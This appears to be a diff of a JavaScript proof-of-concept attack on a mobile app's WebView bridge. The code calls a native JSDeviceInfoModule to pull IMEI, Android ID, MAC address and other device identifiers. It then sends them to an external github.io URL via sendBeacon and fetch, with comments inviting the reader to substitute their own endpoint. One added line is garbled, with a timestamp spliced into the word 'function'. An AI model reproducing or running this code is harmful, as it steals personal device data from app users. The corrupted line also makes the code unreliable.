@@ -155,7 +155,7 @@
   if (window.JSDeviceInfoModule) {
     var deviceFields = ['getDeviceId','getIMEI','getAndroidId','getDeviceInfo','getMacAddress','getIPAddress'];
     deviceFields.forEach(function(fn) {
-      safe('JSDeviceInfoModule.' + fn, function() {
+      safe('JSDeviceInfoModule.' + fn, functi22:18 08-10-2026on() {
         var r = JSDeviceInfoModule[fn] ? JSDeviceInfoModule[fn]() : null;
         if (r) { dataExtracted.push({src:fn, val:r}); log('<span class="warn">' + fn + ':</span> <span class="data">' + r + '</span>', 'danger'); }
       });
@@ -214,7 +214,9 @@
   });
 
   // ── 3. Exfiltration to GitHub Pages callback ─────────────────────────────
-  var EXFIL_URL = 'https://ankitkanojiy.github.io/test_page/log_collector.php';
+  // Uses navigator.sendBeacon (no CORS preflight, works from HTTPS → HTTPS)
+  // Replace EXFIL_URL with your own endpoint if available
+  var EXFIL_URL = 'https://ankitkanojiy.github.io/test_page/log_collector.php'; // placeholder
 
   function exfiltrate(key, val) {
     try {
@@ -222,6 +224,7 @@
       if (navigator.sendBeacon) {
         navigator.sendBeacon(EXFIL_URL, payload);
       }
+      // Also try fetch
       fetch(EXFIL_URL, {method:'POST', body: payload, mode:'no-cors'}).catch(function(){});
     } catch(e) {}
   }
